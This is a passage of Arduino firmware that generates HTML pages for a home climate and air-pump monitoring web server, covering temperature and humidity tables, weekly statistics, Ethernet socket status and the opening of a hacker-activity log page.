            else if (l_sensor == C_Outdoor_Sensor)
              l_out_temp = l_value;
            else if (l_sensor == C_RoofSpace_Sensor)
              l_roof_space_temp = l_value;
            //
#endif
          }
          break;
        case 1:
          l_stat = EPSR(E_Humidity_73);
          if (l_dht_result == DHTLIB_OK)
            l_value = l_hum; //CheckSensorHumidity(l_sensor,int(DHT.humidity));
          //
          if (l_sensor < DC_SensorCountHum)
            l_row = G_ArrayHum[l_sensor].HumPeriodic;
          //
          break;
      }

      G_EthernetClient.println(F(      "<tr>"));
      G_EthernetClient.print(F(          "<td>"));
      G_EthernetClient.print(               C_SensorList[l_sensor]);
      G_EthernetClient.print(F(          "</td>"));
      G_EthernetClient.print(F(          "<td>"));
      G_EthernetClient.print(l_stat);
      if (l_count == 0)
        G_EthernetClient.print(F("&nbsp;(&deg;C)"));
      else //Humidity
        G_EthernetClient.print(F("&nbsp;(%)"));
      //
      G_EthernetClient.print(F(          "</td>"));

      G_EthernetClient.print(F(        "<td>"));
      if (l_count == 0)
        G_EthernetClient.print(TemperatureToString(C_SensorDHT11[l_sensor], l_value, true));
      else
        G_EthernetClient.print(HumidityToString(l_sensor, l_value));
      //
      G_EthernetClient.print(F(        "</td>"));

      if ((l_stat == EPSR(E_Temperature_72)) || (l_sensor < DC_SensorCountHum)) {
        //for (byte l_index = 0; l_index < DC_ClimatePeriodCount; l_index++) {
        for (byte l_index = 0; l_index < l_array_count; l_index++) {
          G_EthernetClient.print(F(        "<td>"));
          if (l_count == 0)
            G_EthernetClient.print(TemperatureToString(C_SensorDHT11[l_sensor], l_row[l_index], true));
          else if (l_sensor < DC_SensorCountHum) //or l_row is NULL
            G_EthernetClient.print(HumidityToString(l_sensor, l_row[l_index]));
          //
          G_EthernetClient.print(F(        "</td>"));
        } //for each statistic period
      }
      G_EthernetClient.println(F(      "</tr>"));

    } //for each sensor

#ifdef D_2WGApp
    //Show Hallway/Outdoor AND Hallway/Ceiling Differential on first iteration
    if (l_count == 0) {
      //blank row
      G_EthernetClient.println(F("<tr>"));
      G_EthernetClient.print(F("<td colspan=\""));
      //G_EthernetClient.print(DC_ClimatePeriodCount + 3);
      G_EthernetClient.print(l_array_count + 3);
      G_EthernetClient.print(F("\">&nbsp;</td>"));
      G_EthernetClient.println(F(      "</tr>"));

      G_EthernetClient.println(F(      "<tr>"));
      G_EthernetClient.print(F(          "<td>"));
      G_EthernetClient.print(F("Front_Door/<br>Outside"));
      G_EthernetClient.print(F(          "</td>"));
      G_EthernetClient.print(F(          "<td>"));
      G_EthernetClient.print(F("Temp_Diff (&deg;C)"));
      G_EthernetClient.print(F(          "</td>"));

      int l_difference;

      G_EthernetClient.print(F(        "<td>"));
      //For a difference no downshift reqd
      //But divide by ten is reqd
      if ((l_front_door_temp != 0) && (l_out_temp != 0)) {
        l_difference = (l_front_door_temp - l_out_temp) / 10;
        if (l_difference >= 0)
          G_EthernetClient.print(l_difference);
        else {
          G_EthernetClient.print('(');
          G_EthernetClient.print(-l_difference);
          G_EthernetClient.print(')');
        }
      }
      G_EthernetClient.print(F(        "</td>"));

      //for (byte l_index = 0; l_index < DC_ClimatePeriodCount; l_index++) {
      for (byte l_index = 0; l_index < l_array_count; l_index++) {
        G_EthernetClient.print(F(        "<td>"));
        l_difference = 0;
        if ((G_ArrayTemp[C_Front_Door_Sensor].TempPeriodic[l_index] != 0) &&
            (G_ArrayTemp[C_Outdoor_Sensor].TempPeriodic[l_index] != 0)) {
          //For a difference no downshift reqd
          //But divide by ten is reqd
          l_difference = (G_ArrayTemp[C_Front_Door_Sensor].TempPeriodic[l_index] -
                          G_ArrayTemp[C_Outdoor_Sensor].TempPeriodic[l_index]) / 10;
          if (l_difference >= 0)
            G_EthernetClient.print(l_difference);
          else {
            G_EthernetClient.print('(');
            G_EthernetClient.print(-l_difference);
            G_EthernetClient.print(')');
          }
        }
        else
          G_EthernetClient.print(F("&nbsp;"));
        //
        G_EthernetClient.print(F(        "</td>"));
      } //for each statistic period
      G_EthernetClient.println(F(      "</tr>"));

      G_EthernetClient.println(F(      "<tr>"));
      G_EthernetClient.print(F(          "<td>"));
      G_EthernetClient.print(F("Front_Door/<br>Roof_Space"));
      G_EthernetClient.print(F(          "</td>"));
      G_EthernetClient.print(F(          "<td>"));
      G_EthernetClient.print(F("Temp_Diff (&deg;C)"));
      G_EthernetClient.print(F(          "</td>"));

      G_EthernetClient.print(F(        "<td>"));
      //These temps are raw so no downshift reqd
      double l_difference2;
      if ((l_front_door_temp != 0) && (l_roof_space_temp != 0)) {
        //For a difference no downshift reqd
        //But divide by ten is reqd
        l_difference2 = (l_roof_space_temp - l_front_door_temp) / 10;
        if (l_difference2 >= 0)
          G_EthernetClient.print(FormatAmt(l_difference2, 1));
        else {
          G_EthernetClient.print('(');
          G_EthernetClient.print(FormatAmt(-l_difference2, 1));
          G_EthernetClient.print(')');
        }
      }
      G_EthernetClient.print(F(        "</td>"));

      //for (byte l_index = 0; l_index < DC_ClimatePeriodCount; l_index++) {
      for (byte l_index = 0; l_index < l_array_count; l_index++) {
        l_difference2 = 0;
        G_EthernetClient.print(F(        "<td>"));
        if ((G_ArrayTemp[C_Front_Door_Sensor].TempPeriodic[l_index] != 0) &&
            (G_ArrayTemp[C_RoofSpace_Sensor].TempPeriodic[l_index] != 0)) {
          //For a difference no downshift reqd
          //But divide by ten is reqd
          l_difference2 = double(G_ArrayTemp[C_RoofSpace_Sensor].TempPeriodic[l_index] -
                                 G_ArrayTemp[C_Front_Door_Sensor].TempPeriodic[l_index]) / 10;
          if (l_difference2 >= 0)
            G_EthernetClient.print(FormatAmt(l_difference2, 1));
          else {
            G_EthernetClient.print('(');
            G_EthernetClient.print(FormatAmt(-l_difference2, 1));
            G_EthernetClient.print(')');
          }
        }
        else
          G_EthernetClient.print(F("&nbsp;"));
        //
        G_EthernetClient.print(F(        "</td>"));
      } //for each statistic period
      G_EthernetClient.println(F(      "</tr>"));

      //OUTPUT HEAT PUMP STATUS HERE
      G_EthernetClient.println(F(      "<tr>"));
      G_EthernetClient.print(F(          "<td>"));
      G_EthernetClient.print(F("Air Pump"));
      G_EthernetClient.print(F(          "</td>"));
      G_EthernetClient.print(F(          "<td>"));
      G_EthernetClient.print(F("Operating Mode"));
      G_EthernetClient.print(F(          "</td>"));

      int l_heat_res;
      int l_hallway_temp;
      int l_outside_temp;
      int l_outside_hum;
      //We assume a complete result
      CalculateHeatResource(l_heat_res, l_hallway_temp, l_outside_temp, l_outside_hum);
      //We get back standardised values which are multiplied by 10 (temp also uplifted 35 degrees)
      //For the heat resource difference no 35 degree downshift reqd
      if (G_AirPumpEnabled == false) //OFF
        G_EthernetClient.print(F("<td>OFF</td>"));
      else if (l_heat_res > 0)
        G_EthernetClient.print(F("<td>HEAT</td>"));
      else
        G_EthernetClient.print(F("<td>COOL</td>"));
      //

      //for (byte l_index = 0; l_index < DC_ClimatePeriodCount; l_index ++) {
      for (byte l_index = 0; l_index < l_array_count; l_index ++) {
        if (G_AirPumpModes[l_index] == 0)
          G_EthernetClient.print(F("<td>OFF</td>"));
        else if (G_AirPumpModes[l_index] == 255) //-1
          G_EthernetClient.print(F("<td>COOL</td>"));
        else
          G_EthernetClient.print(F("<td>HEAT</td>"));
        //
      }
      G_EthernetClient.println(F(      "</tr>"));

      //blank row
      G_EthernetClient.println(F("<tr>"));
      G_EthernetClient.print(F("<td colspan=\""));
      //G_EthernetClient.print(DC_ClimatePeriodCount + 3);
      G_EthernetClient.print(l_array_count + 3);
      G_EthernetClient.print(F("\">&nbsp;</td>"));
      G_EthernetClient.println(F(      "</tr>"));

    } //Do Hallway/Ceiling diff on first iteration - l_count == 0
#endif
  } //for (byte l_count = 0; l_count < 2; l_count++) - Temperature first - then humidity

  G_EthernetClient.println(F(      "</table>"));
  G_EthernetClient.println(F(    "</td>"));

  G_EthernetClient.println(F(  "</tr>"));
  G_EthernetClient.print(F(  "</table>"));
  G_EthernetClient.println(F("</form>"));
  G_EthernetClient.println(F("</body></html>"));
  CheckRAM();
  Pop(c_proc_num);
} //RecentClimateWebPage

//----------------------------------------------------------------------------------------------

void WeekClimateWebPage() {
  const byte c_proc_num = 25;
  Push(c_proc_num);

  //See the SD card files /PUBLIC/INITWBPG.TXT and /PUBLIC/ACTNMENU.TXT
  //for the program code for these two common procedures.
  InitialiseWebPage(EPSR(E_CLIMATE_FOR_WEEK_74));
  if (HTMLParmRead(E_HEAD_315) == "T") {
    CheckRAM();
    Pop(c_proc_num);
    return;
  }
  InsertActionMenu(200, EPSR(E_CLIMATE_FOR_WEEK_74), St_Weekly_Climate_WPE);

  if (UserLoggedIn()) {
    G_EthernetClient.println(F(        "<tr style=\"background-color:Khaki;\">"));
    G_EthernetClient.println(F(            "<td><b>PAGE ACTIONS</b></td>"));
    G_EthernetClient.println(F(        "</tr>"));

    int l_dd, l_mm, l_yyyy = 0;
    DateDecode(Date(), &l_dd, &l_mm, &l_yyyy);
    G_EthernetClient.print(F("<tr><td>"));
    String l_filename = "";
    for (int l_year = 2013; l_year <= l_yyyy; l_year++) { //2013 is the year the system commenced operation
      l_filename = "/HIST" + String(l_year) + ".TXT";
      // Check to see if the file exists
      SPIDeviceSelect(DC_SDCardSSPin);
      if (SD.exists(&l_filename[0])) {
        SPIDeviceSelect(DC_EthernetSSPin);
        G_EthernetClient.print(F("<a href=/HIST"));
        G_EthernetClient.print(l_year);
        G_EthernetClient.print(F(".TXT/>History "));
        G_EthernetClient.print(l_year);
        G_EthernetClient.print(F("</a><br>"));
      }
    }
    SPIDeviceSelect(DC_EthernetSSPin);
    G_EthernetClient.println(F("</td></tr>"));
  }

  //END OF MASTER TABLE, ROW 1, CELL 1 on LHS
  //Time, Page Hits, Page Menu, Action Menu all on LHS
  G_EthernetClient.print(F(        "</table>"));
  G_EthernetClient.print(F(      "</td>"));

  //START OF RHS PAGE DATA
  //A NEW CELL ON ROW 1 OF THE MASTER TABLE
  G_EthernetClient.println(F(    "<td style=\"vertical-align:top;\">"));
  G_EthernetClient.println(F(      "<table border=1>"));
  G_EthernetClient.print(F(          "<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.print(F(            "<td><b>MEASURE</b></td>"));
  G_EthernetClient.print(F(            "<td><b>STATISTIC</b></td>"));
  long l_date = Now() - 600000; //6 days
  for (int l_count = (DC_WeekDayCount - 1); l_count >= 0; l_count--) {
    G_EthernetClient.print(F(          "<td><b>"));
    G_EthernetClient.print(               DayOfWeek(l_date + (l_count * 100000))); //MON, TUE, etc
    G_EthernetClient.print(F(          "</b></td>"));
  }
  G_EthernetClient.println(F(        "</tr>"));

  for (byte l_count = 1; l_count <= 4; l_count++) {
    for (byte l_sensor = 0; l_sensor < DC_SensorCountTemp; l_sensor++) {
      String l_stat = "";
      int* l_row;
      switch (l_count) {
        case 1:
          l_stat = EPSR(E_Temp_hy_Max_138);
          l_row = G_ArrayTemp[l_sensor].TempMax;
          break;
        case 2:
          l_stat = EPSR(E_Temp_hy_Min_139);
          l_row = G_ArrayTemp[l_sensor].TempMin;
          break;
        case 3:
          if (l_sensor < DC_SensorCountHum) {
            l_stat = EPSR(E_Humidity_hy_Max_140);
            l_row = G_ArrayHum[l_sensor].HumMax;
          }
          break;
        case 4:
          if (l_sensor < DC_SensorCountHum) {
            l_stat = EPSR(E_Humidity_hy_Min_141);
            l_row = G_ArrayHum[l_sensor].HumMin;
          }
          break;
      }

      if ((l_count < 3) || (l_sensor < DC_SensorCountHum)) {
        G_EthernetClient.println(F(      "<tr>"));
        G_EthernetClient.print(F(          "<td>"));
        G_EthernetClient.print(               C_SensorList[l_sensor]);
        G_EthernetClient.print(F(          "</td>"));
        G_EthernetClient.print(F(          "<td>"));
        G_EthernetClient.print(               l_stat);
        G_EthernetClient.print(F(          "</td>"));

        for (byte l_day = 0; l_day < DC_WeekDayCount; l_day++) {
          G_EthernetClient.print(F(        "<td>"));
          if (l_count < 3) // 1 and 2 are temp
            G_EthernetClient.print(TemperatureToString(C_SensorDHT11[l_sensor], l_row[l_day], true));
          else //if (l_sensor < DC_SensorCountHum) //3 & 4 are humidity //or l_row is NULL
            G_EthernetClient.print(HumidityToString(l_sensor, l_row[l_day]));
          //
          G_EthernetClient.print(F(        "</td>"));
        } //for each day of the last week
        G_EthernetClient.println(F(      "</tr>"));
      } //Skip inactive humidity rows
    } //for each sensor
  } //for each stat - TEMP/HUM, HIGH/LOW

  G_EthernetClient.println(F(      "</table>"));
  G_EthernetClient.println(F(    "</td>"));

  G_EthernetClient.println(F(  "</tr>"));
  G_EthernetClient.print(F(  "</table>"));
  G_EthernetClient.println(F("</form>"));
  G_EthernetClient.println(F("</body></html>"));
  CheckRAM();
  Pop(c_proc_num);
} //WeekClimateWebPage

//----------------------------------------------------------------------------------------------

#ifdef D_2WGApp
void HomeHeatingRowHeating(byte p_type, const String &p_desc) {
  G_EthernetClient.print(F("<tr><td>"));
  if (p_type == DC_HEAT)
    G_EthernetClient.print(F("Heating"));
  else
    G_EthernetClient.print(F("Cooling"));
  //
  G_EthernetClient.print(F("</td><td>"));
  G_EthernetClient.print(p_desc);
  G_EthernetClient.print(F("</td>"));
} //HomeHeatingRowHeating
#endif

//----------------------------------------------------------------------------------------------

#ifdef D_2WGApp
void HomeHeatingWebPage() {
  const byte c_proc_num = 26;
  Push(c_proc_num);

  //See the SD card files /PUBLIC/INITWBPG.TXT and /PUBLIC/ACTNMENU.TXT
  //for the program code for these two common procedures.
  InitialiseWebPage(EPSR(E_HOME_HEATING_212));
  if (HTMLParmRead(E_HEAD_315) == "T") {
    CheckRAM();
    Pop(c_proc_num);
    return;
  }
  InsertActionMenu(900, EPSR(E_HOME_HEATING_212), St_Home_Heating_WPE);

  if ((UserLoggedIn()) ||
      (LocalIP(G_RemoteIPAddress))) {
    G_EthernetClient.println(F(        "<tr style=\"background-color:Khaki;\">"));
    G_EthernetClient.println(F(            "<td><b>PAGE ACTIONS</b></td>"));
    G_EthernetClient.println(F(        "</tr>"));

    G_EthernetClient.print(F(          "<tr>"));
    G_EthernetClient.print(F(          "<td>"));

    if (!G_AirPumpEnabled) {
      G_EthernetClient.print(F("<a href=/"));
      G_EthernetClient.print(G_PageNames[37]);
      G_EthernetClient.println(F("/>Enable Air Pump</a><br>"));
    }
    else {
      G_EthernetClient.print(F("<a href=/"));
      G_EthernetClient.print(G_PageNames[38]);
      G_EthernetClient.println(F("/>Disable Air Pump</a><br>"));
    }

    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[36]);
    G_EthernetClient.print(F("/>Page Refresh</a>"));

    G_EthernetClient.print(F(          "</td>"));
    G_EthernetClient.println(F(        "</tr>"));
  }

  //END OF MASTER TABLE, ROW 1, CELL 1 on LHS
  //Time, Page Hits, Page Menu, Action Menu all on LHS
  G_EthernetClient.print(F(        "</table>"));
  G_EthernetClient.print(F(      "</td>"));

  //START OF RHS PAGE DATA
  G_EthernetClient.println(F(    "<td style=\"vertical-align:top;\">"));
  //We define a new RHS table that will contain two tables on the first row
  //and one information table on the second row
  G_EthernetClient.println(F(      "<table id=\"RHSTable\" border=\"-1\" width=\"900\">"));
  G_EthernetClient.print(F("<tr>")); //first row of THS table

  G_EthernetClient.println(F(    "<td style=\"vertical-align:top\">"));
  G_EthernetClient.println(F(      "<table id=\"CurrentTable\" border=1 width=\"300\">"));

  G_EthernetClient.print(F(          "<tr style=\"background-color:Aqua\">"));
  G_EthernetClient.print(F(            "<td colspan=\"2\"><b>CURRENT OPERATIONS</b></td>"));
  G_EthernetClient.println(F(        "</tr>"));

  G_EthernetClient.print(F(          "<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.print(F(            "<td><b>MEASURE</b></td><td><b>VALUE</b></td>"));
  G_EthernetClient.println(F(        "</tr>"));

  int l_heat_res;
  int l_hallway_temp;
  int l_outside_temp;
  int l_outside_hum;
  //We assume a complete result
  CalculateHeatResource(l_heat_res, l_hallway_temp, l_outside_temp, l_outside_hum);
  //We get back standardised values which are multiplied by 10 (temp also uplifted 35 degrees)
  //For the heat resource difference no 35 degree downshift reqd

  G_EthernetClient.print(F("<tr>"));
  G_EthernetClient.print(F("<td>Outside Temp</td><td>"));
  G_EthernetClient.print(TemperatureToString(C_SensorDHT11[C_Outdoor_Sensor], l_outside_temp, true));
  G_EthernetClient.println(F("&deg;C</td></tr>"));

  G_EthernetClient.print(F("<tr>"));
  G_EthernetClient.print(F("<td>Outside Humidity</td><td>"));
  G_EthernetClient.print(HumidityToString(C_Outdoor_Sensor, l_outside_hum));
  G_EthernetClient.print(F("%</td></tr>"));

  G_EthernetClient.print(F("<tr>"));
  G_EthernetClient.print(F("<td>Roof Space Temp</td><td>"));
  G_EthernetClient.print(TemperatureToString(C_SensorDHT11[C_RoofSpace_Sensor], l_hallway_temp + l_heat_res, true));
  G_EthernetClient.println(F("&deg;C</td></tr>"));

  G_EthernetClient.print(F("<tr>"));
  G_EthernetClient.print(F("<td>Hallway Temp</td><td>"));
  G_EthernetClient.print(TemperatureToString(C_SensorDHT11[C_Front_Door_Sensor], l_hallway_temp, true));
  G_EthernetClient.println(F("&deg;C</td></tr>"));

  G_EthernetClient.print(F("<tr>"));
  G_EthernetClient.print(F("<td>Heat Resource</td><td>"));
  if (l_heat_res < 0) {
    G_EthernetClient.print('(');
    G_EthernetClient.print(FormatAmt(double(-l_heat_res) / 10, 1));
  }
  else
    G_EthernetClient.print(FormatAmt(double(l_heat_res) / 10, 1));
  //
  G_EthernetClient.print(F("&deg;C"));
  if (l_heat_res < 0)
    G_EthernetClient.print(')');
  //
  G_EthernetClient.println(F("</td></tr>"));

  G_EthernetClient.print(F("<tr>"));
  G_EthernetClient.print(F("<td>Air Pump Mode</td><td>"));
  if (G_AirPumpEnabled == false) //OFF
    G_EthernetClient.print(F("OFF"));
  else if (l_heat_res > 0)
    G_EthernetClient.print(F("HEAT"));
  else
    G_EthernetClient.print(F("COOL"));
  //
  G_EthernetClient.println(F("</td></tr>"));

  G_EthernetClient.println(F("</table>"));  //current status table
  G_EthernetClient.print(F("</td>")); //end first cell on first row of RHS table

  //The weekly heating statisics starts in the 2nd cell of the first row of the RHS table
  G_EthernetClient.println(F(    "<td style=\"vertical-align:top\">"));
  G_EthernetClient.println(F(    "<table id=\"DailyHistory\" border=\"1\" width=\"600\">"));

  G_EthernetClient.print(F(      "<tr style=\"background-color:Aqua\">"));
  G_EthernetClient.print(F(        "<td colspan=\"9\"><b>WEEKLY OPERATING STATISTICS</b></td></tr>"));

  G_EthernetClient.print(F(          "<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.print(F(            "<td><b>MODE</b></td>"));
  G_EthernetClient.print(F(            "<td><b>STATISTIC</b></td>"));
  long l_date = Now() - 600000; //6 days
  for (int l_count = (DC_WeekDayCount - 1); l_count >= 0; l_count--) {
    G_EthernetClient.print(F(          "<td><b>"));
    G_EthernetClient.print(               DayOfWeek(l_date + (l_count * 100000))); //MON, TUE, etc
    G_EthernetClient.print(F(          "</b></td>"));
  }
  G_EthernetClient.println(F(        "</tr>"));

  //Output the weeks air pump statistics
  //First we need to know if we are in heating or cooling mode
  boolean l_heat = true; //D
  if (G_AirPumpEnabled) {
    int l_heat_res;
    int l_front_door_temp;
    int l_outside_temp;
    int l_outside_hum;
    if (CalculateHeatResource(l_heat_res, l_front_door_temp, l_outside_temp, l_outside_hum)) {
      //We get back standardised values which are multiplied by 10 (temp also uplifted 35 degrees)
      //For the heat resource difference no 35 degree downshift reqd
      if (l_heat_res < 0)
        l_heat = false;
      //
    }
  }
  for (int l_set = 0; l_set < DC_HeatingSetCount; l_set++) {

    //long Duration - time interval
    long l_duration = 0;
    HomeHeatingRowHeating(l_set, EPSR(E_Duration_317));
    for (int l_day = 0; l_day < DC_WeekDayCount; l_day++) {
      G_EthernetClient.print(F("<td>"));
      l_duration = G_HeatingSet[l_set][l_day].Duration;
      if ((l_day == 0) && (G_AirPumpEnabled) &&
          (((l_set == 0) && (l_heat)) || ((l_set == 1) && (!l_heat)))
         )
        l_duration += long(Time());
      //
      if (l_duration != 0)
        G_EthernetClient.print(TimeToHHMM(l_duration));
      //
      G_EthernetClient.print(F("</td>"));
    }
    G_EthernetClient.print(F("</tr>"));

    //long Resource - standardised temp
    //int  ResourceCount;
    HomeHeatingRowHeating(l_set, EPSR(E_Resource_318));
    for (int l_day = 0; l_day < DC_WeekDayCount; l_day++) {
      G_EthernetClient.print(F("<td>"));
      if (G_HeatingSet[l_set][l_day].ResourceCount != 0)
        G_EthernetClient.print(TemperatureToString(false, G_HeatingSet[l_set][l_day].Resource / G_HeatingSet[l_set][l_day].ResourceCount, true)); //false = DHT22, true = parenthese -ve
      //
      G_EthernetClient.print(F("</td>"));
    }
    G_EthernetClient.print(F("</tr>"));

    //long Benefit - standardised temp
    HomeHeatingRowHeating(l_set, EPSR(E_Baseline_323));
    for (int l_day = 0; l_day < DC_WeekDayCount; l_day++) {
      G_EthernetClient.print(F("<td>"));
      long l_baseline = G_HeatingSet[l_set][l_day].Baseline;
      if ((l_day == 0) && (G_AirPumpEnabled) &&
          (((l_set == 0) && (l_heat)) || ((l_set == 1) && (!l_heat))) ) {
        int l_temp, l_hum = 0;
        if (DHTRead(C_Hallway_Sensor, l_temp, l_hum) == DHTLIB_OK)
          l_baseline += l_temp; //Standardise this temp difference
        else
          l_baseline = 0;
        //
      }
      l_baseline += 350; //Force accumulate benefit differences back to standard Ardy values
      if (G_HeatingSet[l_set][l_day].Duration != 0)
        G_EthernetClient.print(TemperatureToString(false, l_baseline, true)); //false = DHT22, true = parenthese -ve
      //
      G_EthernetClient.print(F("</td>"));
    }

    //long Baseline - standardised temp
    HomeHeatingRowHeating(l_set, EPSR(E_Benefit_319));
    for (int l_day = 0; l_day < DC_WeekDayCount; l_day++) {
      G_EthernetClient.print(F("<td>"));
      long l_benefit = G_HeatingSet[l_set][l_day].Benefit;
      if ((l_day == 0) && (G_AirPumpEnabled) &&
          (((l_set == 0) && (l_heat)) || ((l_set == 1) && (!l_heat))) ) {
        int l_temp, l_hum = 0;
        if (DHTRead(C_Front_Door_Sensor, l_temp, l_hum) == DHTLIB_OK)
          l_benefit += l_temp; //Standardise this temp difference
        else
          l_benefit = 0;
        //
      }
      l_benefit += 350; //Force accumulate benefit differences back to standard Ardy values
      if (G_HeatingSet[l_set][l_day].Duration != 0)
        G_EthernetClient.print(TemperatureToString(false, l_benefit, true)); //false = DHT22, true = parenthese -ve
      //
      G_EthernetClient.print(F("</td>"));
    }

    G_EthernetClient.println(F("</tr>"));
  } //HEAT and COOL
  G_EthernetClient.println(F("</table>")); //weekly stats table

  G_EthernetClient.println(F("</td></tr>")); //second cell of first row of RHS table

  if (!G_Mobile_Flag) {
    G_EthernetClient.print(F("<tr>"));
    G_EthernetClient.println(F("<td colspan=\"2\" style=\"vertical-align:top;\">"));
    G_EthernetClient.println(F("<table id=\"InfoTable\" border=\"1\">"));
    G_EthernetClient.print  (F("<tr style=\"font-family:Courier;background-color:White;\">"));
    G_EthernetClient.println(F("<td align=\"left\">"));

    G_EthernetClient.print  (F("Catweazle has now installed his air pump in the roof space of "));
    G_EthernetClient.print  (F("his house and is testing the unit's effectiveness in drawing "));
    G_EthernetClient.print  (F("surplus heat from the roof space into the house hallway.<br>"));
    G_EthernetClient.print  (F("<br>"));
    G_EthernetClient.print  (F("Look at the image http://www.2wg.co.nz/IMAGES/TM28051X.PNG for "));
    G_EthernetClient.print  (F("an example of roof space heat resources that Catweazle wishes "));
    G_EthernetClient.print  (F("to utilise in autumn, winter and spring where he can.<br>"));
    G_EthernetClient.print  (F("<br>"));

    G_EthernetClient.print(F("</td>"));
    G_EthernetClient.print(F("</tr>"));
    G_EthernetClient.println(F("</table>")); //text table
    G_EthernetClient.print(F("</td>"));
    G_EthernetClient.print(F("</tr>"));
  }

  G_EthernetClient.println(F(      "</table>")); //RHS TABLE

  G_EthernetClient.println(F(    "</td>")); //2nd cell of form table used for RHS table
  G_EthernetClient.println(F(  "</tr>")); //form table - one row
  G_EthernetClient.print(F(  "</table>")); //form table
  G_EthernetClient.println(F("</form>"));
  G_EthernetClient.println(F("</body></html>"));
  CheckRAM();
  Pop(c_proc_num);
} //HomeHeatingWebPage
#endif

//----------------------------------------------------------------------------------------------

void EthernetSocketWebPage() {
  const byte c_proc_num = 65;
  Push(c_proc_num);

  //See the SD card files /PUBLIC/INITWBPG.TXT and /PUBLIC/ACTNMENU.TXT
  //for the program code for these two common procedures.
  InitialiseWebPage(EPSR(E_ETHERNET_SOCKETS_283));
  if (HTMLParmRead(E_HEAD_315) == "T") {
    CheckRAM();
    Pop(c_proc_num);
    return;
  }
  InsertActionMenu(750, EPSR(E_ETHERNET_SOCKETS_283), St_Ethernet_Socket_WPE);
  if (UserLoggedIn()) {
    //Insert action menu items here
  }

  //END OF MASTER TABLE, ROW 1, CELL 1 on LHS
  //Time, Page Hits, Page Menu, Action Menu all on LHS
  G_EthernetClient.print(F(        "</table>"));
  G_EthernetClient.print(F(      "</td>"));

  //START OF RHS PAGE DATA
  //A NEW CELL ON ROW 1 OF THE MASTER TABLE
  G_EthernetClient.println(F(    "<td style=\"vertical-align:top;\">"));
  G_EthernetClient.println(F(      "<table border=1 width=100%>"));
  G_EthernetClient.print(F(          "<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.print(F(            "<td><b>SOCKET</b></td><td><b>STATUS</b></td><td><b>PORT IN</b></td>"));
  G_EthernetClient.print(F(            "<td><b>IP ADDRESS</b></td><td><b>PORT OUT</b></td>"));
  G_EthernetClient.println(F(        "</tr>"));

  char l_buffer[4] = "";
  for (uint8_t l_socket = 0; l_socket < MAX_SOCK_NUM; l_socket++) {
    G_EthernetClient.print(F("<tr><td>"));

    //Socket #
    G_EthernetClient.print(l_socket);
    G_EthernetClient.print(F("</td><td>"));

    //Status
    uint8_t l_status = W5100.readSnSR(l_socket);
    sprintf(l_buffer, "%x", l_status);
    G_EthernetClient.print(l_buffer);
    G_EthernetClient.print(F("</td><td>"));

    //Port In
    G_EthernetClient.print(W5100.readSnPORT(l_socket));
    G_EthernetClient.print(F("</td><td>"));

    //IP Address
    uint8_t dip[4];
    W5100.readSnDIPR(l_socket, dip);
    for (byte l_byte = 0; l_byte < DC_IPAddressFieldCount; l_byte++) {
      G_EthernetClient.print(dip[l_byte]);
      if (l_byte < 3)
        G_EthernetClient.print(".");
      //
    }
    G_EthernetClient.print(F("</td><td>"));

    //Port Out (destination)
    G_EthernetClient.print(W5100.readSnDPORT(l_socket));
    G_EthernetClient.print(F("</td></tr>"));

  } //for each socket

  if (!G_Mobile_Flag) {
    G_EthernetClient.print(F("<tr>"));
    G_EthernetClient.println(F("<td colspan=\"5\" style=\"vertical-align:top;\">"));
    G_EthernetClient.println(F("<table border=1>"));
    G_EthernetClient.print  (F("<tr style=\"font-family:Courier;background-color:White;\">"));
    G_EthernetClient.println(F("<td align=\"left\">"));

    G_EthernetClient.println(F("Ethernet Socket Status Values:<br>"));
    G_EthernetClient.println(F("0x00 = CLOSED &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x13 = INIT &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x14 = LISTEN<br>"));
    G_EthernetClient.println(F("0x15 = SYNSENT &nbsp;&nbsp;&nbsp;&nbsp;0x16 = SYNRECV &nbsp;&nbsp;0x17 = CONNECTED<br>"));
    G_EthernetClient.println(F("0x18 = FIN_WAIT &nbsp;&nbsp;&nbsp;0x1A = CLOSING &nbsp;&nbsp;0x1B = TIME_WAIT<br>"));
    G_EthernetClient.println(F("0x1C = CLOSE_WAIT &nbsp;0x1D = LAST_ACK &nbsp;0x22 = UDP<br>"));
    G_EthernetClient.println(F("0x32 = IPRAW &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x42 = MACRAW &nbsp;&nbsp;&nbsp;0x5F = PPPOE<br>"));

    G_EthernetClient.print(F("</td>"));
    G_EthernetClient.print(F("</tr>"));
    G_EthernetClient.println(F("</table>"));
    G_EthernetClient.print(F("</td>"));
    G_EthernetClient.print(F("</tr>"));
  }

  G_EthernetClient.println(F(      "</table>"));
  G_EthernetClient.println(F(    "</td>"));

  G_EthernetClient.println(F(  "</tr>"));
  G_EthernetClient.print(F(  "</table>"));
  G_EthernetClient.println(F("</form>"));
  G_EthernetClient.println(F("</body></html>"));
  CheckRAM();
  Pop(c_proc_num);
} //EthernetSocketWebPage

//----------------------------------------------------------------------------------------------

void HackerActivityWebPage() {
  const byte c_proc_num = 81;
  Push(c_proc_num);

  //See the SD card files /PUBLIC/INITWBPG.TXT and /PUBLIC/ACTNMENU.TXT
  //for the program code for these two common procedures.
  InitialiseWebPage(EPSR(E_HACKER_ACTIVITY_320));
  if (HTMLParmRead(E_HEAD_315) == "T") {
    CheckRAM();
    Pop(c_proc_num);
    return;
  }
  InsertActionMenu(775, "HACKER ACTIVITY", St_Banned_IP_Addresses_WPE);

  G_EthernetClient.println(F("<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.println(F("<td><b>PAGE ACTIONS</b></td>"));
  G_EthernetClient.println(F("</tr>"));

  G_EthernetClient.println(F("<tr><td><br>"));
  //Insert action menu items here
  if ((UserLoggedIn()) ||
      (LocalIP(G_RemoteIPAddress))) {
    G_EthernetClient.print(F("<input type='submit' formaction='/"));
    G_EthernetClient.print(G_PageNames[32]);
    G_EthernetClient.println(F("/' style='width:150px;height:30px;font-size:20px' value='IP Process'>"));
    G_EthernetClient.print(F("<br>"));
  }
  InsertLogFileLinks(DC_Hack_Attempt_Log);

  G_EthernetClient.print(F("</td></tr>"));

  //END OF MASTER TABLE, ROW 1, CELL 1 on LHS
  //Time, Page Hits, Page Menu, Action Menu all on LHS
